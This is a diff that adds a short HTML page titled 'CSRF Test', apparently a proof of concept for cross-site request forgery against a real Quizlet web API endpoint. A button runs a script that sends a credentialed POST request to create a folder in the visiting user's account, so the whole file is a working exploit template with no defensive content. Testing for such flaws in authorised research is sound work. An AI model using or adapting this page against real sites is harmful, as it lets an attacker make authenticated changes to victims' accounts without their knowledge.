@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h3>CSRF Test</h3>
+    <button onclick="send()">Click to send CSRF</button>
+
+    <script>
+      function send() {
+        fetch("https://quizlet.com/webapi/3.1/folders/save?_method=POST", {
+          method: "POST",
+          credentials: "include",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            data: [
+              {
+                name: "api2",
+                description: ""
+              }
+            ]
+          })
+        }).then(r => console.log("Response status:", r.status));
+      }
+    </script>
+  </body>
+</html>
